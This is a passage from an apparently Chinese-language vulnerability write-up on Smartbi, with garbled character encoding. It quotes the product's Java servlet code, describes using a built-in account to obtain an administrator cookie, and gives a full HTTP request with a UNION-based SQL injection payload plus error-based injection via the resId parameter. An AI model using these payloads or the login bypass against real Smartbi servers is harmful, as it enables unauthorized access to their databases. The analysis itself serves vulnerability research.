<span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">SmartbiException</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">CommonErrorCode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">UNKOWN_ERROR</span><span style="color: #E06C75">))</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDetail</span><span style="color: #ABB2BF">(className </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot; &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> notFoundClass);</span></span>
<span class="line"><span style="color: #E06C75">                }</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">long</span><span style="color: #E06C75"> startTime </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Date</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTime</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> obj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">service</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">JSONArray</span><span style="color: #ABB2BF">(params));</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">long</span><span style="color: #E06C75"> duration </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Date</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getTime</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> startTime</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obj </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Collection) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isArray</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Boolean) </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">(obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Number)) {</span></span>
<span class="line"><span style="color: #E06C75">                        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> String) {</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">quote</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">(), buff);</span></span>
<span class="line"><span style="color: #E06C75">                        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">isEnum</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">quote</span><span style="color: #ABB2BF">(((Enum)obj).</span><span style="color: #61AFEF">name</span><span style="color: #ABB2BF">(), buff);</span></span>
<span class="line"><span style="color: #E06C75">                        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                            </span><span style="color: #E5C07B">JSONObject</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromBeanToString</span><span style="color: #ABB2BF">(obj, buff);</span></span>
<span class="line"><span style="color: #E06C75">                        }</span></span>
<span class="line"><span style="color: #E06C75">                    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                        </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">());</span></span>
<span class="line"><span style="color: #E06C75">                    }</span></span>
<span class="line"><span style="color: #E06C75">                } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">retCode</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:0,&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">result</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">JSONArray</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromObjectToString</span><span style="color: #ABB2BF">(obj, buff);</span></span>
<span class="line"><span style="color: #E06C75">                }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;,</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">duration</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> duration);</span></span>
<span class="line"><span style="color: #E06C75">            }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;}&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">            resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">buff</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">RMIModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">doCommit</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">ce</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (className </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> methodName </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">exceptionToString</span><span style="color: #E06C75">(className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> methodName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ce)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            }</span></span>
<span class="line"><span style="color: #E06C75">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> resultStr</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
</li>
<li><p>åˆ°UserManagerModule çš„ loginFromDB çš„â½…æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173431155.png" srcset="/img/loading.gif" lazyload alt="image-20250811212506631"></p>
</li>
<li><p>SecurityServiceImpl çš„ loginFromDB â½…æ³•å¯¹ä¼ â¼Šçš„è´¦å·å¯†ç è¿›â¾åˆ¤æ–­ï¼Œå¦‚æœç™»å½•æˆ åŠŸè¿”å›trueï¼Œå³å¯è¿”å›ç®¡ç†å‘˜Cookie</p>
<p>ï¼ˆå…¶ä¸­service:0aæ˜¯smartBiçš„å†…ç½®è´¦å·ï¼‰</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loginFromDB</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> password) {</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> loginSucceed </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">IConnectionInfo</span><span style="color: #E06C75"> info </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">userManagerModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDaoModule</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getRepository</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnectionInfo</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Connection</span><span style="color: #E06C75"> conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">PreparedStatement</span><span style="color: #E06C75"> prep </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">ResultSet</span><span style="color: #E06C75"> rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">   </span></span>
<span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">           conn </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ConnectionPool</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getConnection</span><span style="color: #ABB2BF">(info);</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;select c_userpwd from t_user where c_username=?&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">           prep </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">conn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">prepareStatement</span><span style="color: #ABB2BF">(sql);</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setString</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, username);</span></span>
<span class="line"><span style="color: #E06C75">           rs </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">executeQuery</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">               </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> pass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;c_userpwd&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">               loginSucceed </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> pass </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">pass</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(password);</span></span>
<span class="line"><span style="color: #E06C75">           }</span></span>
<span class="line"><span style="color: #E06C75">   </span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">rs</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">prep</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">       } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">log</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getLanguageValue</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Unabletoaccessdata&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;: &quot;</span><span style="color: #ABB2BF">, e);</span></span>
<span class="line"><span style="color: #E06C75">       } </span><span style="color: #C678DD">finally</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">           </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">closeDBObject</span><span style="color: #ABB2BF">(rs, prep, conn);</span></span>
<span class="line"><span style="color: #E06C75">       }</span></span></code></pre></div></div></figure></li>
</ol>
<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><h4 id="payloadï¼šï¼ˆ1ï¼‰"><a href="#payloadï¼šï¼ˆ1ï¼‰" class="headerlink" title="payloadï¼šï¼ˆ1ï¼‰"></a>payloadï¼šï¼ˆ1ï¼‰</h4><p>å‘åŒ…ï¼Œç›´æ¥è·å–æ•°æ®åº“åï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173432983.png" srcset="/img/loading.gif" lazyload alt="image-20250811215840293"></p>
<h4 id="æ¼æ´åˆ†æï¼šï¼ˆ1ï¼‰"><a href="#æ¼æ´åˆ†æï¼šï¼ˆ1ï¼‰" class="headerlink" title="æ¼æ´åˆ†æï¼šï¼ˆ1ï¼‰"></a>æ¼æ´åˆ†æï¼šï¼ˆ1ï¼‰</h4><ol>
<li><p>smartbi&#x2F;vision&#x2F;FileResourceï¼ˆä»åç§°å…¥æ‰‹ï¼‰</p>
<p>å¯»æ‰¾FileResourceç›¸å…³çš„æ–‡ä»¶åç§°<strong>FileResourceServlet</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173434902.png" srcset="/img/loading.gif" lazyload alt="image-20250811213747684"></p>
<p>ä» doGet â½…æ³•ä¸­ï¼Œåˆ©ç”¨request.getParameter(â€œresIdâ€) è·å–resIdå‚æ•°ï¼Œæ‹¼æ¥åˆ°sqlè¯­å¥æ‰§è¡Œ<strong>ï¼ˆæ²¡æœ‰ä½¿â½¤é¢„ç¼–è¯‘å¤„ç†ï¼‰</strong></p>
</li>
<li><p>åœ¨web.xmlæŸ¥çœ‹ç›¸å…³è·¯å¾„çš„ä»£ç </p>
<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;FileResource&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;smartbi.freequery.fileresource.FileResourceServlet&lt;/</span><span style="color: #E06C75">servlet-class</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;/</span><span style="color: #E06C75">servlet</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;FileResource&lt;/</span><span style="color: #E06C75">servlet-name</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">		&lt;</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;/vision/FileResource&lt;/</span><span style="color: #E06C75">url-pattern</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	&lt;/</span><span style="color: #E06C75">servlet-mapping</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
</li>
<li><p>æ‰§â¾sqlè¯­å¥æŠ¥é”™åï¼Œä¼šå°†æŠ¥é”™ä¿¡æ¯è¿”å›ç»™å®¢æˆ·ç«¯å¹¶å¼¹çª—æç¤ºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ¥é”™æ¥è¿›â¾æ³¨â¼Š</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173437858.png" srcset="/img/loading.gif" lazyload alt="image-20250811215709280"></p>
</li>
</ol>
<h4 id="payloadï¼šï¼ˆ2ï¼‰"><a href="#payloadï¼šï¼ˆ2ï¼‰" class="headerlink" title="payloadï¼šï¼ˆ2ï¼‰"></a>payloadï¼šï¼ˆ2ï¼‰</h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:127.0.0.1:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Macintosh; </span><span style="color: #61AFEF">Intel</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mac</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">OS</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">X</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10</span><span style="color: #98C379">_14_3</span><span style="color: #ABB2BF">) AppleWebKit/60</span></span>
<span class="line"><span style="color: #61AFEF">5.1.15</span><span style="color: #ABB2BF"> (KHTML, </span><span style="color: #98C379">like</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Gecko</span><span style="color: #ABB2BF">) Version/12.0.3 Safari/605.1.15</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=</span><span style="color: #D19A66">66</span><span style="color: #98C379">D3B217CBE76A3BB32C771E6EB6429C</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">99</span></span>
<span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UrlLinkService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">getFileResource</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[&quot;1&#39;union selec</span></span>
<span class="line"><span style="color: #98C379">t database(),2,3,4,5,6#&quot;]</span></span></code></pre></div></div></figure>

<p>æŠ“åŒ…ï¼Œä½¿ç”¨unionè”åˆæ³¨å…¥ï¼ˆæœ‰å›æ˜¾ï¼‰ï¼ˆæŠ¥é”™ï¼Œç›²æ³¨ï¼‰</p>
<h4 id="æ¼æ´åˆ†æï¼šï¼ˆ2ï¼‰"><a href="#æ¼æ´åˆ†æï¼šï¼ˆ2ï¼‰" class="headerlink" title="æ¼æ´åˆ†æï¼šï¼ˆ2ï¼‰"></a>æ¼æ´åˆ†æï¼šï¼ˆ2ï¼‰</h4><ol>
<li><p>FileResourceDAO ä¸­ getFileResource â½…æ³•ä¸­ï¼Œè¿™â¾¥æˆ‘ä»¬çœ‹åˆ° idå‚æ•°ä¸ºStringç±»å‹ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å¹¶æ‰§â¾</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173440049.png" srcset="/img/loading.gif" lazyload alt="image-20250811224500461"></p>
</li>
<li><p>è·Ÿè¿‘getFileResourceï¼Œåœ¨ URLLinkService çš„ getFileResourceè¢«è°ƒç”¨</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FileResource</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getFileResource</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileResourceID) {</span></span>
